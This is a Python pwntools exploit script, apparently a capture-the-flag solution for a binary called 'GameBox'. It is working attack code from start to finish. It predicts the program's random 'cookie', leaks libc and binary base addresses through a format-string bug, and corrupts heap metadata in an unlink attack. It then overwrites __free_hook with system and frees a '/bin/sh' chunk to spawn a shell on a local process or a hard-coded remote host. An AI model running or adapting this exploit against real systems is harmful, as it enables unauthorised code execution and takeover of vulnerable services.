# coding:utf-8
from pwn import *
import ctypes
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
so = ctypes.CDLL('/home/moonagirl/moonagirl/libc/libc_local_x64')
# a = so.rand()
LOCAL = 1
if LOCAL:
    context.log_level = 'debug'
    io = process('./GameBox_fy82399ry3nc2103r')#,env={"LD_PRELOAD":"./libc-2.24.so"})
#    __malloc_hook+68
    
else:
    main_arena_off = 0x3c4b78
    #io = remote("47.90.103.10", 6000)nc 39.107.33.43 13570
    io = remote("39.107.33.43", 13570)
def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def Guess():
    s0 = ''
    for i in range(0,24):
        s0 += chr(so.rand() % 26 + ord('A'))
    return s0

def mmenu(choice):
    io.recvuntil("(E)xit\n")
    io.sendline(choice)

def play(length,name):
    mmenu('P')
    io.recvuntil('Come on boy!Guess what I write:\n')
    data = Guess()
    for i in range(0,24):
        io.send(data[i])
    io.send('@')
    io.recvuntil('Input your name length:\n')
    io.sendline(str(length))
    io.recvuntil('Input your name:\n')
    io.sendline(name)
    return data

def Show():
    mmenu('S')

def Delete(index,cookie):
    mmenu('D')
    io.recvuntil('Input index:\n')
    io.sendline(str(index))
    io.recvuntil('Input Cookie:\n')
    io.sendline(cookie)

def Change(index,data,name):
    mmenu('C')
    io.recvuntil('Input index:\n')
    io.sendline(str(index))
    io.recvuntil('Input Cookie:\n')
    io.sendline(data)
    io.recvuntil('input your new name(no longer than old!):\n')
    io.sendline(name)

system_libc = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
def pwnit():
    data0 = play(0x120,'%13$lxAAAA%15$lxBBBB%9$lx') #0
#    io.interactive()
    Show()
    libc_start_main = libc.symbols['__libc_start_main']
    io.recvuntil('0:')
    data = int(io.recv(12),16) #__libc_start_main+F0
    io.recvuntil('AAAA')
    data1 = int(io.recv(12),16)
    io.recvuntil('BBBB')#main+61
    data2 = int(io.recv(12),16)
#    print hex(data)
    main = 0x0000000000001874
    base = data2 - main - 0x61
    libc_base = data - libc.symbols['__libc_start_main'] - 0xF0
    system_addr = libc_base + system_libc
    free_hook_addr = libc_base + free_hook
#    success('stack1:'+hex(data1))
    success('base:'+hex(base))
    success('libc_base:'+hex(libc_base))
    success('system_addr:'+hex(system_addr))
    success('free_hook_addr:'+hex(free_hook_addr))


    data1 = play(0x108,'aaa') #1
    data2 = play(0x120,'aaa') #2
    data3 = play(0x120,'/bin/sh\x00') #3
    data4 = play(0x120,'/bin/sh\x00') #4
    buf1 = 'a'*(0x100 - 0x10) + p64(0x100) + p64(0x161)*5
    Change(2,data2,buf1)
    success('coike2:'+data2)
    rank_ptr = 0x0000000000203100
    ptr = rank_ptr + 0x30
    # Delete(1,data1):
    # data1 = play(0x120,'aaa') #1
    buf = p64(0)+p64(0x101)
    buf += p64(base+ptr-0x18)+p64(base+ptr-0x10)+'a'*0xe0+p64(0x100)
    Change(1,data1,buf)
    success('ptr:'+hex(base+ptr))
    success('system_addr:'+hex(system_addr))
    Delete(2,data2)

    buf2 = 'a'*24 + p64(free_hook_addr)#libc_base + libc.symbols['strlen'])# + p64(free_hook_addr)*2#p64(0)*(3 + 0x30 + 0x30) + p64(free_hook_addr)*2
#    Show()
    Change(1,data1,buf2)
    Change(1,data1,p64(system_addr))
#    z()
#    Change(1,data1,p64(system_addr))
    Delete(3,data3)
    # mmenu('C')
    # io.recvuntil('Input index:\n')
    # io.sendline(str(4))
    # io.recvuntil('Input Cookie:\n')
    # io.sendline(data4)
    # io.recvuntil('input your new name(no longer than old!):\n')
    # io.sendline('/bin/sh\x00')
#    Show()
    io.interactive()
    # myy = data1 - (0x007FFFCEE8B068 - 0x007FFFCEE8B018)
    # buf1 = '%' + str(myy & 0xffff) + 'c'+ '%{}$hn'.format(15)
    # data1 = play(0x100,buf1) #1
    # Show()

    # buf2 = '%' + str(free_hook_addr & 0xffffffff) + 'c'+ '%{}$n'.format(41)
    # data3 = play(0x100,buf2) #2
    # Show()

    
if __name__ == "__main__":
    pwnit()

